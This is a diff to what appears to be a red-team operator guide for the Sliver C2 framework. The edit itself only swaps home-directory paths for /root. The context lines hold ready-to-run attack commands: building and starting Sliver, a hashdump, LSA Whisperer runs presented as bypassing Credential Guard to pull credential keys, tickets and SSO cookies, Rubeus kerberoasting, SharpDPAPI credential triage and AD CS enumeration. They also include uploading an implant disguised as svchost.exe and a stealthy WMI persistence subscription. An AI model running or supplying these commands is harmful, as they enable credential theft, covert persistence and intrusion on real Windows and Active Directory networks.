@@ -85,8 +85,8 @@ pwsh -c "Install-Module -Name Az -Repository PSGallery -Force -Scope CurrentUser
 ### 1a: Build Sliver
 
 ```bash
-git clone https://github.com/mgstate/sliver.git ~/sliver
-cd ~/sliver
+git clone https://github.com/mgstate/sliver.git /root/sliver
+cd /root/sliver
 bash setup.sh
 ```
 
@@ -95,7 +95,7 @@ Installs Go, MinGW, Harriet, builds Sliver, downloads tools, creates helper scri
 ### 1b: Start Server + Listener
 
 ```bash
-cd ~/sliver
+cd /root/sliver
 ./start.sh
 ```
 
@@ -169,7 +169,7 @@ openssl pkcs12 -in AzureAppCert.pfx -nokeys -clcerts 2>/dev/null | openssl x509 
 
 ```bash
 # cd to where you downloaded the PFX
-cd ~/Downloads   # or wherever your PFX is
+cd /root/Downloads   # or wherever your PFX is
 ```
 
 ```powershell
@@ -465,13 +465,13 @@ hashdump
 
 ### execute-assembly with Local Tools
 
-For tools NOT in the armory, use `execute-assembly` with local .exe files from `~/sliver/tools/`:
+For tools NOT in the armory, use `execute-assembly` with local .exe files from `/root/sliver/tools/`:
 
 ```
 # LSA Whisperer — works even with Credential Guard enabled
 # NOTE: Native C++ exe, NOT .NET — cannot use execute-assembly (needs CLR)
 # Must upload + execute, or use shell command
-upload ~/sliver/tools/sharp-tools/lsa-whisperer.exe C:\Windows\Temp\lw.exe
+upload /root/sliver/tools/sharp-tools/lsa-whisperer.exe C:\Windows\Temp\lw.exe
 shell
 # Then in the shell:
 C:\Windows\Temp\lw.exe --msv credkey
@@ -484,21 +484,21 @@ C:\Windows\Temp\lw.exe --cloudap ssocookie
 rm C:\Windows\Temp\lw.exe
 
 # Seatbelt — full host recon
-execute-assembly --in-process ~/sliver/tools/sharp-tools/Seatbelt.exe -group=all
+execute-assembly --in-process /root/sliver/tools/sharp-tools/Seatbelt.exe -group=all
 
 # SharpUp — privesc checks
-execute-assembly --in-process ~/sliver/tools/sharp-tools/SharpUp.exe audit
+execute-assembly --in-process /root/sliver/tools/sharp-tools/SharpUp.exe audit
 
 # Certify — AD CS enumeration
-execute-assembly --in-process ~/sliver/tools/sharp-tools/Certify.exe find /vulnerable
+execute-assembly --in-process /root/sliver/tools/sharp-tools/Certify.exe find /vulnerable
 
 # SharpDPAPI — DPAPI credential blobs
-execute-assembly --in-process ~/sliver/tools/sharp-tools/SharpDPAPI.exe triage
-execute-assembly --in-process ~/sliver/tools/sharp-tools/SharpDPAPI.exe machinecredentials
+execute-assembly --in-process /root/sliver/tools/sharp-tools/SharpDPAPI.exe triage
+execute-assembly --in-process /root/sliver/tools/sharp-tools/SharpDPAPI.exe machinecredentials
 
 # Rubeus (local copy — same as armory but always available)
-execute-assembly --in-process ~/sliver/tools/sharp-tools/Rubeus.exe kerberoast /format:hashcat /nowrap
-execute-assembly --in-process ~/sliver/tools/sharp-tools/Rubeus.exe triage
+execute-assembly --in-process /root/sliver/tools/sharp-tools/Rubeus.exe kerberoast /format:hashcat /nowrap
+execute-assembly --in-process /root/sliver/tools/sharp-tools/Rubeus.exe triage
 ```
 
 ### Tool Paths (after setup.sh)
@@ -506,7 +506,7 @@ execute-assembly --in-process ~/sliver/tools/sharp-tools/Rubeus.exe triage
 All execute-assembly tools are in one directory:
 
 ```
-~/sliver/tools/sharp-tools/
+/root/sliver/tools/sharp-tools/
 ├── lsa-whisperer.exe    # Credential Guard bypass (EvanMcBroom)
 ├── Rubeus.exe           # Kerberos attacks
 ├── Seatbelt.exe         # Host recon
@@ -585,7 +585,7 @@ Invoke-Binary /home/kali/tools/SharpDPAPI.exe triage
 # LSA Whisperer — works even with Credential Guard (talks to LSA directly)
 # NOTE: Native C++ exe, NOT .NET — Invoke-Binary won't work (needs CLR)
 # Upload first, then execute directly:
-upload ~/sliver/tools/sharp-tools/lsa-whisperer.exe C:\Windows\Temp\lw.exe
+upload /root/sliver/tools/sharp-tools/lsa-whisperer.exe C:\Windows\Temp\lw.exe
 cmd /c C:\Windows\Temp\lw.exe --msv credkey
 cmd /c C:\Windows\Temp\lw.exe --msv ntlmv1
 cmd /c C:\Windows\Temp\lw.exe --kerberos klist
@@ -759,7 +759,7 @@ schtasks /query /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" /v /fo list
 # WMI permanent event subscription — survives reboots, very stealthy
 
 # First upload implant to DBServer
-upload ~/sliver/tools/sharp-tools/teams-db.exe C:\ProgramData\Microsoft\Network\svchost.exe
+upload /root/sliver/tools/sharp-tools/teams-db.exe C:\ProgramData\Microsoft\Network\svchost.exe
 
 # Create WMI event filter (triggers 5 min after boot)
 $filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter `
